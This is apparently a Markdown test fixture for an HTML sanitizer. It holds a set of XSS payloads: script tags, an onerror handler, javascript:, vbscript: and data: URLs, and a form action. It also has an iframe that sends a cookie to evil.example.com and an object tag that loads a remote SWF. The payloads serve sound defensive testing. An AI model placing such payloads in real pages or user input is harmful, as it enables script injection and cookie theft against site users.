# XSS Injection Test Story

This story contains injected attack payloads that must be neutralized by the sanitizer (NFR64).

## Inline Script Injection

<script>alert(1)</script>

## Event Handler Injection

<img src="x" onerror="alert(1)">

## JavaScript URL Injection

[Click me](javascript:alert(1))

## vbscript URL

<a href="vbscript:msgbox(1)">vbscript link</a>

## Iframe Injection

<iframe src="https://evil.example.com/steal?cookie=document.cookie"></iframe>

## Data URL Injection

<a href="data:text/html,<script>alert(1)</script>">data link</a>

## Form Action Injection

<form action="javascript:alert(1)">
  <input type="submit" value="Submit">
</form>

## Object Tag Injection

<object data="https://evil.example.com/malicious.swf"></object>

## Normal Content

This is normal text that should appear in the rendered page.
The entity FR234 is referenced here.

### Status

status: in-progress
